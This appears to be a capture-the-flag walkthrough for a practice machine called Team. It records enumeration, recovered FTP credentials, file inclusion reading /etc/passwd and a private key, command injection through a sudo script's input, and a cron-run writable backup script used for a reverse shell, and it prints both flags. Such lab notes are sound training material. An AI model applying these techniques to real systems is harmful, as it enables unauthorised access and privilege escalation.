IP : 10.10.41.18

Open Ports : 21, 22, 80

Enumeration :

80 : Default apache page : We have directions in title for adding team.htm in hosts file

We found the website.

Run gobuster:

/images (Status: 301)
/index.html (Status: 200)
/scripts (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)


In robots.txt we found a potential name : dale.

Maybe We can bruteforce ftp. No Luck,

Looking at directories we found a scripts dierectory: brute it : script.txt : 

	We found a note : # Note to self had to change the extension of the old "script" in this folder, as it has creds in

Brute it with old added as extention : script.old :
	ftpuser : T3@m$h@r3

	also found another user name : gyles

Lets check the ftp now : We found a new file New_site.txt : We found that we have nother site as .dev

Lets add to host file and check that out : 

	We can see the new site, it uses a placeholder, with parameter page?= for page disaply, lets check for LFI

Using /etc/passwd we can see that we have LFI.

Lets check for common linux files. Wrodlist : SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

We found dale's private key : 

Login vai SSH : 

We found the user's flag : THM{6Y0TXHz7c2d}


PrivEsc : 

We can use sudo to run something as gyles:

	(gyles) NOPASSWD: /home/gyles/admin_checks

Lets check that out.

#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"


We can use the $error variable used to capture date as it is being passed to system call.

dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: abc
Enter 'date' to timestamp the file: /bin/bash
The Date is 
python3 -c "import pty; pty.spawn('/bin/bash')"
gyles@TEAM:~$ ls


Now we are gyles, since we dont know his password we cannot use sudo.

Lets upload linpeas.

User groups identified as admins : 

	AdminIdentities=unix-group:sudo;unix-group:admin

We found that our user belong to admin group : 

	uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)  

We found a backup script belonging to admin group : /usr/local/bin/main_backup.sh

Lets check that out.

We have write permissions to it, lets check what it does : 

it copies file : cp -r /var/www/team.thm/* /var/backups/www/team.thm/

Lets use it to get a reverse shell.

Setup the listener and wait for cron job to run :

We got a reverse shell

Navigate and cat /root/root.txt : THM{fhqbznavfonq}
